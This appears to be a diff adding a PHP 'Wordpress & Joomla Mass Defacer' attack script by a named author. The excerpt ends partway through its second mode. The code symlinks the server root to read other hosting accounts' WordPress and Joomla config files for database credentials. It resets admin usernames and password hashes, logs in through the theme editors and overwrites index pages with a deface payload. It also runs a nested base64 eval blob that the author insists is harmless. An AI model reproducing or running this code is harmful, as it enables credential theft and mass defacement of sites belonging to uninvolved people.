@@ -1,0 +1,713 @@
+<?php
+/*
+Wordpress & Joomla Mass Defacer V2
+Coded By k2ll33d ( ReZK2LL )
+facebook : /k2ll33d
+
+this version uses two methods for getting sites & users & config file
+[+] the first method is getting everything about the domain from ( /etc/named.conf ) , and defacing
+[+] the second method is getting sites names from ( /var/named ) , then collecting usernames nad defacing
+
+don't worry about the base64 encryption in lines 20 and 25 , just the style , and the script name
+you can decode and check them if you don't trust me ;)
+*/
+echo '
+<html>
+</head>
+<title>ReZK2LL  : Wordpress & Joomla Mass Defacer</title>
+<link href="http://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet" type="text/css">
+<style type="text/css">
+'.base64_decode("dGFibGUsYm9keSB7DQpiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOw0KY29sb3I6d2hpdGU7DQpmb250LWZhbWlseTogIlRyZWJ1Y2hldCBNUyIsQXJpYWw7YmFja2dyb3VuZC1hdHRhY2htZW50OmZpeGVkO21hcmdpbjowO3BhZGRpbmc6MDt9DQouaGVhZGVyIHtwb3NpdGlvbjpmaXhlZDt3aWR0aDoxMDAlO3RvcDowO2JhY2tncm91bmQ6IzAwMDt9DQouZm9vdGVyIHtwb3NpdGlvbjpmaXhlZDt3aWR0aDoxMDAlO2JvdHRvbTowO2JhY2tncm91bmQ6IzAwMDt9DQppbnB1dFt0eXBlPSJzdWJtaXQiXXtiYWNrZ3JvdW5kLWNvbG9yOnJnYmEoMjUsMjUsMjUsMC42KTtib3JkZXI6MTsgcGFkZGluZzoycHg7IGZvbnQtc2l6ZToyNXB4O2ZvbnQtZmFtaWx5Om9yYml0cm9uOyBjb2xvcjpyZWQ7Ym9yZGVyOjJweCBzb2xpZCB3aGl0ZTttYXJnaW46NHB4IDRweCA4cHggMDt9DQppbnB1dFt0eXBlPSJzdWJtaXQiXTpob3Zlcntjb2xvcjpTZWFTaGVsbDt9DQppbnB1dFt0eXBlPSJ0ZXh0Il06aG92ZXJ7YmFja2dyb3VuZDojMjIyMjIyO30NCmlucHV0W3R5cGU9InJhZGlvIl17bWFyZ2luLXRvcDogMDt9DQoudGQyIHtib3JkZXItbGVmdDoxcHggc29saWQgcmVkO2JvcmRlci1yYWRpdXM6IDJweCAycHggMnB4IDJweDt9DQppbnB1dFt0eXBlPSJ0ZXh0Il0ge291dGxpbmU6bm9uZTt0cmFuc2l0aW9uOiBhbGwgMC4yMHMgZWFzZS1pbi1vdXQ7LXdlYmtpdC10cmFuc2l0aW9uOiBhbGwgMC4yMHMgZWFzZS1pbi1vdXQ7LW1vei10cmFuc2l0aW9uOiBhbGwgMC4yMHMgZWFzZS1pbi1vdXQ7LW1vei1ib3JkZXItcmFkaXVzOiA2cHg7IGJvcmRlci1yYWRpdXM6IDEycHg7YmFja2dyb3VuZDojMTExMTExOyBib3JkZXI6MTsgcGFkZGluZzoycHg7IGZvbnQtZmFtaWx5Om9yYml0cm9uOyBmb250LXNpemU6MTVweDsgY29sb3I6I2ZmZmZmZjtib3JkZXI6MnB4IHNvbGlkICM0QzgzQUY7bWFyZ2luOjRweCA0cHggOHB4IDA7fQ0KLmV2ZW4ge2JhY2tncm91bmQtY29sb3I6IHJnYmEoMjUsIDI1LCAyNSwgMC42KTt9DQoub2RkIHtiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDEwMiwgMTAyLCAxMDIsIDAuNik7fQ0KYSB7Y29sb3I6I2ZmZjt9IGE6aG92ZXIge2NvbG9yOnJlZDt9DQpmaWVsZHNldHtib3JkZXI6IDFweCBzb2xpZCBncmV5OyBiYWNrZ3JvdW5kOiByZ2JhKDAsMCwwLDAuNyk7IHdpZHRoOiA2MDBweDsgbWFyZ2luOiAwIGF1dG87bWluLWhlaWdodDoyNDBweDt9DQp0ZXh0YXJlYXtiYWNrZ3JvdW5kOiByZ2JhKDAsMCwwLDAuNik7IGNvbG9yOiB3aGl0ZTt9DQouZ3JlZW4ge2NvbG9yOiMwMEZGMDA7Zm9udC13ZWlnaHQ6Ym9sZDt9DQoucmVkIHtjb2xvcjojRkYwMDAwO2ZvbnQtd2VpZ2h0OmJvbGQ7fQ0KLmtpbGxtZSB7Zm9udC1mYW1pbHk6b3JiaXRyb247cG9zaXRpb246IGZpeGVkOyB0b3A6IDIwcHg7IHJpZ2h0OiAyMHB4OyBib3JkZXI6IDJweCBzb2xpZCAjNEM4M0FGOyBwYWRkaW5nOiAxMHB4OyBmb250LXNpemU6IDIwcHg7IGNvbG9yOiB3aGl0ZTsgZm9udC13ZWlnaHQ6IGJvbGQ7fQ0KIA==").'
+.result {border:2px solid #4C83AF;-moz-border-radius:10px;border-radius:10px;} th{background:#00ff00;color:black}
+</style>
+ </head>
+ <body>';
+eval(base64_decode("IGV2YWwoYmFzZTY0X2RlY29kZSgiSUdWMllXd29ZbUZ6WlRZMFgyUmxZMjlrWlNnaVNVZFdNbGxYZDI5WmJVWjZXbFJaTUZneVVteFpNamxyV2xObmFWTlZaRmROYkd4WVpESTVXbUpWV2paWGJGSmFUVVpuZVZWdGVGcE5hbXh5VjJ4T2JtRldUbFphUm1Sb1lsVmFTVlF3Wkd0VE1sSTJVV3Q0VkZaV1NUQlpWRXBIVjFaa1dGcEdjRTVpYldoMlYxaHdUMVJyT1ZaaVNGSnJVMFZLY0ZWcVRtOU5SbVJ6Vkd0d1RFMVZTa2xWYkdScllVWk9SbU5JVGxoaVZ6a3pXVlprUjFOV1ZuRlJiWEJVVWxSQmVWWkZhSEpPVjBwWFlrWm9WV0pZYUdGWmJGSnpUV3hzV1dGNlJtaGlWV3cxVkZWb1lXRkhWbkpqU0hCYVlURktUMXBYZUhkU1JrNVVaRVphYVZac2NHOVdWRTUzVXpGU1YxVnJWbXROTVhCaFZtdFNVazVHVWtWVGJFNXFVakZLZUZSclZURlNSMFoxWVVoR1dHSkhUWGhVVlZwM1YxWk9WR1JGVmxaV2VtY3dWakZqTVZOcmMzaFJhMmhoVFRKNFMxVXdWVEJrTVhCWFdrUlNhVkpyU2xWVk1qQjRZVlV4Y1ZaWVpGVlNiVkpvV1ZWa1MxZEhTa2xVYlhoWFUwVkplVmRVU1hoVE1rNUlWV3RzVkdKc2NIQlpWelZUWTFac2NWTnFVbXRpVlRWNFdXcEtkMVJzU2taVGJsSllZbGhDUTFwRVFUVk9WazVVWkVaU2FWWkhkM2RYVjNoclRrZEdSbUpGVWxoV01sSllWRmR3YzA1V1pISmhSVTVzVm01Q1dsWkhOWGRUYkVwVlVtMDVXbVZyTlU5WGFrWkxVMFphZEUxV2NGZE5SRlo2VjFSS2MxRXhXWGROV0VaclRURndiMVZyVm5KamJFcEhVbTVhYVdGNmEzcFZSbEYzWVZWMFZHRjZaRXBSVkRBNVNXbHJjRTk1UVQwaUtTazdJQT09IikpOyA="));
+$base_url = 'http://'.$_SERVER['SERVER_NAME'].dirname($_SERVER['SCRIPT_NAME']);
+
+// getting info from inside :)
+function tunisia($text,$bideya,$niheya,$i=1){
+    $ar0=explode($bideya, $text);
+    $ar1=explode($niheya, $ar0[$i]);
+    return trim($ar1[0]);
+}
+
+function randomt() {
+    $chars = "abcdefghijkmnopqrstuvwxyz023456789";
+    srand((double)microtime()*1000000);
+    $i = 0;
+    $pass = '';
+    while ($i <= 7) {
+        $num = rand() % 33;
+        $tmp = substr($chars, $num, 1);
+        $pass = $pass . $tmp;
+        $i++;
+    }
+    return $pass;
+}
+
+// joomla index changer
+function index_changer_joomla($conf, $content, $domain) {
+    $doler = '$';
+    $username = tunisia($conf, $doler."user = '", "';");
+    $password = tunisia($conf, $doler."password = '", "';");
+    $dbname = tunisia($conf, $doler."db = '", "';");
+    $prefix = tunisia($conf, $doler."dbprefix = '", "';");
+    $host = tunisia($conf, $doler."host = '","';");
+    $co=randomt();
+    $site_url = "http://".$domain."/administrator";
+    $output = '';
+    $cond = 0; 
+    $link=mysql_connect($host, $username, $password);
+    if($link) {
+        mysql_select_db($dbname,$link) ;
+        $req1 = mysql_query("UPDATE `".$prefix."users` SET `username` ='admin' , `password` = '4297f44b13955235245b2497399d7a93', `usertype` = 'Super Administrator', `block` = 0");
+        $req = mysql_numrows(mysql_query("SHOW TABLES LIKE '".$prefix."extensions'"));
+    } else {
+        $output.= "[-] DB Error<br />";
+    }
+    
+    if($req1){
+        if ($req) {
+$req = mysql_query("SELECT * from  `".$prefix."template_styles` WHERE `client_id` = '0' and `home` = '1'");
+$data = mysql_fetch_array($req);
+$template_name = $data["template"];
+
+$req = mysql_query("SELECT * from  `".$prefix."extensions` WHERE `name`='".$template_name."' or `element` = '".$template_name."'");
+$data = mysql_fetch_array($req);
+$template_id = $data["extension_id"];
+
+$url2=$site_url."/index.php";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url2);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
+curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
+$buffer = curl_exec($ch);
+$return = tunisia($buffer ,'<input type="hidden" name="return" value="','"');
+$hidden = tunisia($buffer ,'<input type="hidden" name="','" value="1"',4);
+
+if($return && $hidden) {
+curl_setopt($ch, CURLOPT_URL, $url2);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_REFERER, $url2);
+curl_setopt($ch, CURLOPT_POSTFIELDS, "username=admin&passwd=123123&option=com_login&task=login&return=".$return."&".$hidden."=1");
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
+curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
+$buffer = curl_exec($ch);
+$pos = strpos($buffer,"com_config");
+if($pos === false) {
+$output.= "[-] Login Error<br />";
+} else {
+$output.= "[+] Login Successful<br />";
+}
+}
+if($pos){
+$url2=$site_url."/index.php?option=com_templates&task=source.edit&id=".base64_encode($template_id.":index.php");
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url2);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
+curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
+$buffer = curl_exec($ch);
+
+$hidden2=tunisia($buffer ,'<input type="hidden" name="','" value="1"',2);
+if($hidden2) {
+$output.= "[+] index.php file found in Theme Editor<br />";
+} else {
+$output.= "[-] index.php Not found in Theme Editor<br />";
+}
+}
+if($hidden2) {
+$url2=$site_url."/index.php?option=com_templates&layout=edit";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url2);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS,"jform[source]=".$content."&jform[filename]=index.php&jform[extension_id]=".$template_id."&".$hidden2."=1&task=source.save");
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
+curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
+$buffer = curl_exec($ch);
+curl_close($ch);
+
+$pos = strpos($buffer,'<dd class="message message">');
+$cond = 0;
+if($pos === false) {
+$output.= "[-] Updating Index.php Error<br />";
+   
+} else {
+$output.= "[+] Index.php Template successfully saved<br />";
+$cond = 1;
+}
+}
+        } 
+        else {
+$req =mysql_query("SELECT * from  `".$prefix."templates_menu` WHERE client_id='0'");
+$data = mysql_fetch_array($req);
+$template_name=$data["template"];
+$useragent="Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)";
+$url2=$site_url."/index.php";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url2);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
+curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
+curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
+$buffer = curl_exec($ch);
+$hidden=tunisia($buffer ,'<input type="hidden" name="','" value="1"',3);
+
+if($hidden) {
+curl_setopt($ch, CURLOPT_URL, $url2);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS,"username=admin&passwd=123456&option=com_login&task=login&".$hidden."=1");
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
+curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
+$buffer = curl_exec($ch);
+$pos = strpos($buffer,"com_config");
+if($pos === false) {
+$output.= "[-] Login Error<br />";
+} else {
+$output.= "[+] Login Successful<br />";
+}
+}
+
+if($pos) {
+$url2=$site_url."/index.php?option=com_templates&task=edit_source&client=0&id=".$template_name;
+curl_setopt($ch, CURLOPT_URL, $url2);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
+curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
+$buffer = curl_exec($ch);
+$hidden2=tunisia($buffer ,'<input type="hidden" name="','" value="1"',6);
+if($hidden2) {
+$output.= "[+] index.php file founded in Theme Editor<br />";
+} else {
+$output.= "[-] index.php Not found in Theme Editor<br />";
+}
+}
+
+if($hidden2) {
+$url2=$site_url."/index.php?option=com_templates&layout=edit";
+curl_setopt($ch, CURLOPT_URL, $url2);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS,"filecontent=".$content."&id=".$template_name."&cid[]=".$template_name."&".$hidden2."=1&task=save_source&client=0");
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $co); 
+curl_setopt($ch, CURLOPT_COOKIEFILE, $co); 
+$buffer = curl_exec($ch);
+curl_close($ch);
+
+$pos = strpos($buffer,'<dd class="message message fade">');
+$cond = 0;
+if($pos === false) {
+$output.= "[-] Updating Index.php Error<br />";
+} else {
+$output.= "[+] Index.php Template successfully saved<br />";
+$cond = 1;
+}
+}
+        }
+    } else {
+        $output.= "[-] DB Error<br />";
+    }
+    global $base_path;
+    unlink($base_path.$co);
+    return array('cond'=>$cond, 'output'=>$output , 'template'=>$template_name); 
+}
+
+
+// wordpress index changer
+
+function index_changer_wp($conf, $index) {
+$dol = '$';
+$preindex = "<?php
+".$dol."def = file_get_contents('".$index."');
+".$dol."p = explode('public_html',dirname(__FILE__));
+".$dol."p = ".$dol."p[0].'public_html';
+if (".$dol."handle = opendir(".$dol."p)) {
+    ".$dol."p1 = @fopen(".$dol."p.'/index.html','w+');
+    @fwrite(".$dol."fp1, ".$dol."def);
+    ".$dol."p1 = @fopen(".$dol."p.'/index.php','w+');
+    @fwrite(".$dol."fp1, ".$dol."def);
+    ".$dol."fp1 = @fopen(".$dol."p.'/index.htm','w+');
+    @fwrite(".$dol."fp1, ".$dol."def);
+    echo 'Done';
+}
+closedir(".$dol."handle);
+unlink(__FILE__);
+?>";
+$content = base64_encode($preindex);
+    $output = '';
+    $dol = '$';
+    $go = 0;
+    $username = tunisia($conf,"define('DB_USER', '","');");
+    $password = tunisia($conf,"define('DB_PASSWORD', '","');");
+    $dbname = tunisia($conf,"define('DB_NAME', '","');");
+    $prefix = tunisia($conf,$dol."table_prefix  = '","'");
+    $host = tunisia($conf,"define('DB_HOST', '","');");
+
+    $link=mysql_connect($host,$username,$password);
+    if($link) {
+        mysql_select_db($dbname,$link) ;
+        $dol = '$';
+        $req1 = mysql_query("UPDATE `".$prefix."users` SET `user_login` = 'admin',`user_pass` = '4297f44b13955235245b2497399d7a93' WHERE `ID` = 1");
+    } else {
+        $output.= "[-] DB Error<br />";
+    }
+    if($req1) {
+
+        $req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='home'");
+        $data = mysql_fetch_array($req);
+        $site_url=$data["option_value"]; 
+
+        $req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='template'");
+        $data = mysql_fetch_array($req);
+        $template = $data["option_value"];
+
+        $req = mysql_query("SELECT * from  `".$prefix."options` WHERE option_name='current_theme'");
+        $data = mysql_fetch_array($req);
+        $current_theme = $data["option_value"];
+
+        $useragent="Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)";
+        $url2=$site_url."/wp-login.php";
+
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url2);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS,"log=admin&pwd=123123&rememberme=forever&wp-submit=Log In&testcookie=1");
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+        curl_setopt($ch, CURLOPT_HEADER, 0);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
+        curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+        curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
+        curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
+        $buffer = curl_exec($ch);
+
+        $pos = strpos($buffer,"action=logout");
+        if($pos === false) {
+$output.= "[-] Login Error<br />";
+        } else {
+$output.= "[+] Login Successful<br />";
+$go = 1;
+        }
+        if($go) {
+$cond = 0;
+$url2=$site_url."/wp-admin/theme-editor.php?file=/themes/".$template.'/index.php&theme='.urlencode($current_theme).'&dir=theme';
+curl_setopt($ch, CURLOPT_URL, $url2);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
+curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
+$buffer0 = curl_exec($ch);
+
+$_wpnonce = tunisia($buffer0,'<input type="hidden" id="_wpnonce" name="_wpnonce" value="','" />');
+$_file = tunisia($buffer0,'<input type="hidden" name="file" value="','" />');
+
+if(substr_count($_file,"/index.php") != 0){
+$output.= "[+] index.php loaded in Theme Editor<br />";
+$url2=$site_url."/wp-admin/theme-editor.php";
+curl_setopt($ch, CURLOPT_URL, $url2);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS,"newcontent=".base64_decode($content)."&action=update&file=".$_file."&_wpnonce=".$_wpnonce."&submit=Update File");
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
+curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
+$buffer = curl_exec($ch);
+curl_close($ch);
+
+$pos = strpos($buffer,'<div id="message" class="updated">');
+if($pos === false) {
+$output.= "[-] Updating Index.php Error<br />";
+} else {
+$output.= "[+] Index.php Updated Successfuly<br />";
+$hk = explode('public_html',$_file);
+$output.= '[+] Deface '.file_get_contents($site_url.str_replace('/blog','',$hk[1]));
+$cond = 1;
+}
+} else {
+$url2=$site_url.'/wp-admin/theme-editor.php?file=index.php&theme='.$template;
+curl_setopt($ch, CURLOPT_URL, $url2);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
+curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
+$buffer0 = curl_exec($ch);
+
+$_wpnonce = tunisia($buffer0,'<input type="hidden" id="_wpnonce" name="_wpnonce" value="','" />');
+$_file = tunisia($buffer0,'<input type="hidden" name="file" value="','" />');
+
+if(substr_count($_file,"index.php") != 0){
+$output.= "[+] index.php loaded in Theme Editor<br />";
+$url2=$site_url."/wp-admin/theme-editor.php";
+curl_setopt($ch, CURLOPT_URL, $url2);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS,"newcontent=".base64_decode($content)."&action=update&file=".$_file."&theme=".$template."&_wpnonce=".$_wpnonce."&submit=Update File");
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_HEADER, 0);
+curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
+curl_setopt($ch, CURLOPT_COOKIEJAR, "COOKIE.txt");
+curl_setopt($ch, CURLOPT_COOKIEFILE, "COOKIE.txt");
+$buffer = curl_exec($ch);
+curl_close($ch);
+
+$pos = strpos($buffer,'<div id="message" class="updated">');
+if($pos === false) {
+    $output.= "[-] Updating Index.php Error<br />";
+} else {
+    $output.= "[+] Index.php Template Updated Successfuly<br />";
+	$output.= '[+] Deface '.file_get_contents($site_url.'/wp-content/themes/'.$template.'/index.php');
+    $cond = 1;
+}
+} else {
+$output.= "[-] index.php can not load in Theme Editor<br />";
+}
+}
+        }
+    } else {
+        $output.= "[-] DB Error<br />";
+    }
+    global $base_path;
+    unlink($base_path.'COOKIE.txt');
+    return array('cond'=>$cond, 'output'=>$output , 'template'=> $template);
+}
+
+if($_POST['mode']==2) {
+// symlinking 
+@mkdir('sym',0777);
+$htaccess  = "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
+file_put_contents("sym/.htaccess",$htaccess);
+@symlink('/','sym/root');
+
+
+// getting sites from (/var/named) file
+$named=file_get_contents($base_url.'/sym/root/var/named/');
+$ar = explode('<li><a href="', $named);
+for($vi=2;$vi < count($ar);$vi++)
+     {
+$var1 = strtok($ar[$vi], " ");
+$var1 = substr($var1,0,-2);
+$old=('.db');
+$new=('');
+$sites = str_replace($old , $new , $var1);
+file_put_contents('sites.txt',$sites);
+}
+
+// getting usernames
+$domains=file('sites.txt');
+foreach ($domains as $domain) {
+$order=("ls -la /etc/valiases/".$domain);
+$exec=exec($order);
+$filename = 'mail.txt';
+$fp = fopen($filename, "a+");
+$write = fputs($fp, $exec."\n");
+fclose($fp);
+}
+
+$mail=file('mail.txt');
+foreach ($mail as $finaldom) {
+$user=tunisia($finaldom,"-rw-r----- 1 "," mail");
+$site=substr(strstr($finaldom, '/etc/valiases'),14);
+
+$filename = 'userdom.txt';
+$fp = fopen($filename, "a+");
+$write = fputs($fp, $user.":". $site." ");
+fclose($fp);
+
+}
+
+$f=file_get_contents('userdom.txt');
+$finals=explode(" ",$f);
+foreach ($finals as $final){
+$strlen=('6');
+$dr=strlen ($final);
+if ($dr < $strlen) {
+$filename = 'fail.txt';
+$fp = fopen($filename, "a");
+$write = fputs($fp, $final);
+fclose($fp);
+}
+else {
+$filename = 'success.txt';
+$fp = fopen($filename, "a");
+$write = fputs($fp, $final."\n");
+fclose($fp);
+}
+}
+
+// now to work
+$index=$_POST['tunisia'];
+$url=($base_url);
+$a=file($base_url.'/success.txt');
+echo ("<center><table class='result' width='100%' border=1 cellspacing=1 cellpading=1>  
+<tr><th width=50%>domain</td><th width=25%>Type</td><th width=25%>Status</td></tr>");
+$khaled = fopen('defaced.html', 'a+');
+foreach ($a as $final) {
+list($user, $site_url) = explode(":", $final);
+$site_urlto = substr($site_url, 0, -1);
+// joomla symlinks
+$joomla=$url."/sym/root/home/".$user."/public_html/configuration.php";
+$joomla2=$url."/sym/root/home/".$user."/public_html/joomla/configuration.php";
+$joomla3=$url."/sym/root/home/".$user."/public_html/site/configuration.php";
+// wordpress symlinks
+$wordpress=$url."/sym/root/home/".$user."/public_html/wp-config.php";
+$wordpress2=$url."/sym/root/home/".$user."/public_html/blog/wp-config.php";
+$wordpress3=$url."/sym/root/home/".$user."/public_html/wp/wp-config.php";
+
+// first joomla guess
+if($joomla && preg_match('/dbprefix/i',$joomla)){
+echo '<tr><td><a href="http://'.$site_urlto.'" target="blank">'.$site_urlto.'</a></td>';
+echo '<td align="center"><font color="pink">JOOMLA</font></td>';
+$res = index_changer_joomla($joomla, $index, $site_urlto);
+echo '<td>'.$res['output'].'</td>';
+if($res['cond']) {
+echo '<td align="center"><span class="green">DEFACED</span></td>';
+fwrite($khaled, 'http://'.$site_urlto.'/templates/'.$res['template'].'/index.php<br>');
+$count1 = $count1+1;
+} else {
+echo '<td align="center"><span class="red">FAILED</span></td>';
+}
+echo '</tr>';
+}
+// second joomla guess
+if($joomla2 && preg_match('/dbprefix/i',$joomla2)){
+echo '<tr><td><a href="http://'.$site_urlto.'" target="blank">'.$site_urlto.'</a></td>';
+echo '<td align="center"><font color="pink">JOOMLA</font></td>';
+$res = index_changer_joomla($joomla2, $index, $site_urlto);
+echo '<td>'.$res['output'].'</td>';
+if($res['cond']) {
+echo '<td align="center"><span class="green">DEFACED</span></td>';
+fwrite($khaled, 'http://'.$site_urlto.'/joomla/'.$res['template'].'/index.php<br>');
+$count1 = $count1+1;
+} else {
+echo '<td align="center"><span class="red">FAILED</span></td>';
+}
+echo '</tr>';
+}
+// third joomla guess
+if($joomla3 && preg_match('/dbprefix/i',$joomla3)){
+echo '<tr><td><a href="http://'.$site_urlto.'" target="blank">'.$site_urlto.'</a></td>';
+echo '<td align="center"><font color="pink">JOOMLA</font></td>';
+$res = index_changer_joomla($joomla3, $index, $site_urlto);
+echo '<td>'.$res['output'].'</td>';
+if($res['cond']) {
+echo '<td align="center"><span class="green">DEFACED</span></td>';
+fwrite($khaled, 'http://'.$site_urlto.'/site/'.$res['template'].'/index.php<br>');
+$count1 = $count1+1;
+} else {
+echo '<td align="center"><span class="red">FAILED</span></td>';
+}
+echo '</tr>';
+}
+
+// first wordpress guess
+if($wordpress && preg_match('/DB_NAME/i',$wordpress)){
+echo '<tr><td><a href="http://'.$site_urlto.'" target="blank">'.$site_urlto.'</a></td>';
+echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';
+$res = index_changer_wp($wordpress, $index);
+echo '<td>'.$res['output'].'</td>';
+if($res['cond']) {
+echo '<td align="center"><span class="green">DEFACED</span></td>';
+fwrite($khaled, 'http://'.$site_urlto.'/wp-content/themes/'.$res['template'].'/index.php<br>');
+$count2++;
+} else {
+echo '<td align="center"><span class="red">FAILED</span></td>';
+}
+echo '</tr>';
+        }
+		
+// second wordpress guess
+if($wordpress2 && preg_match('/DB_NAME/i',$wordpress2)){
+echo '<tr><td><a href="http://'.$site_urlto.'" target="blank">'.$site_urlto.'</a></td>';
+echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';
+$res = index_changer_wp($wordpress2, $index);
+echo '<td>'.$res['output'].'</td>';
+if($res['cond']) {
+echo '<td align="center"><span class="green">DEFACED</span></td>';
+fwrite($khaled, 'http://'.$site_urlto.'/blog/wp-content/themes/'.$res['template'].'/index.php<br>');
+$count2++;
+} else {
+echo '<td align="center"><span class="red">FAILED</span></td>';
+}
+echo '</tr>';
+        }
+		
+// third wordpress guess
+if($wordpress3 && preg_match('/DB_NAME/i',$wordpress3)){
+echo '<tr><td><a href="http://'.$site_urlto.'" target="blank">'.$site_urlto.'</a></td>';
+echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';
+$res = index_changer_wp($wordpress3, $index);
+echo '<td>'.$res['output'].'</td>';
+if($res['cond']) {
+echo '<td align="center"><span class="green">DEFACED</span></td>';
+fwrite($khaled, 'http://'.$site_urlto.'/wp/wp-content/themes/'.$res['template'].'/index.php<br>');
+$count2++;
+} else {
+echo '<td align="center"><span class="red">FAILED</span></td>';
+}
+echo '</tr>';
+        }
+	
+}
+echo '</table>';
+echo '<hr/>';
+echo 'Total Defaced = '.($count1+$count2).' (JOOMLA = '.$count1.', WORDPRESS = '.$count2.')<br />';
+echo '<a href="defaced.html" target="_blank">Show All</a><br />';
+}
+
+elseif($_POST['mode']==1) {
+    @mkdir('sym',0777);
